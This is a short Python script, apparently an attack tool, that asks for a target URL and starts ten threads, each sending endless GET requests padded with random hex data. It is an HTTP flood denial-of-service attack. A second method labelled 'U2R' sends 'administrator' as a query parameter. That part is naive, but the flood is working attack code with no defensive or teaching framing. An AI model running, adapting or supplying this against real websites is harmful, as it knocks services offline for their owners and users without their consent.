import random
import requests
import time
import threading

class Attacks:
    def __init__(self):
        try:
            self.size = random.randint(10, 200)
            self.attack = random._urandom(self.size).hex() * 50  # Convert to hex to make it URL-safe and repeat to increase size
            self.data = "administrator"
            self.url = input("URL> ")
            print(" ")
            print("Launching Attack")
            print(" ")
        except ValueError:
            print(" ")
            exit("\033[1;34m Invalid Input: Please enter a valid number \033[1;m")
        except KeyboardInterrupt:
            print(" ")
            exit("\033[1;34m [-]Canceled By User \033[1;m")

    def dos_attack_thread(self):
        while True:
            try:
                response = requests.get(f"{self.url}?data={self.attack}")
                print("Attacking sending bytes ===> Status Code:", response.status_code)
            except KeyboardInterrupt:
                print(" ")
                exit("\033[1;34m [-]Canceled By User \033[1;m")
            except requests.RequestException as e:
                print("Request failed:", e)

    def launch_dos_attack(self):
        threads = []
        for i in range(10):
            thread = threading.Thread(target=self.dos_attack_thread)
            thread.start()
            threads.append(thread)
        
        for thread in threads:
            thread.join()

    def launch_U2R_attack(self):
        try:
            url_attack = self.url + "/?data=" + self.data
            response = requests.get(url_attack)
            print("Attacking sending data ===> Status Code:", response.status_code)
            time.sleep(3)
        except KeyboardInterrupt:
            print(" ")
            exit("\033[1;34m [-]Canceled By User \033[1;m")
        except requests.RequestException as e:
            print("Request failed:", e)

